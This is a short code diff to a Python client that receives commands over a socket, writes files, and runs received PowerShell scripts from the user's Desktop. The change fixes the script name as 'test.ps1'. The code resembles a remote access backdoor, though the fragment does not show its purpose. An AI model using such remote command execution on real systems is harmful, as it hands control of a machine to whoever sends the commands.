@@ -93,7 +93,7 @@ def receive_commands():
             command_result = write_file(path=file_path, content=received_command[3])
             
         elif received_command[0] == "run":
-            command_result = run_powerShell_script(received_command[1],received_command[2])
+            command_result = run_powerShell_script(data= received_command[2])
 
             
             
@@ -113,9 +113,9 @@ def receive_commands():
     s.close() 
     
 # run powerShell script
-def run_powerShell_script(fileName,data):
+def run_powerShell_script(data):
     desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-    file_path = os.path.join(desktop_path, fileName)
+    file_path = os.path.join(desktop_path, "test.ps1")
 
     write_file(path=file_path, content=data)
     result = execute_command("PowerShell -File " + file_path)
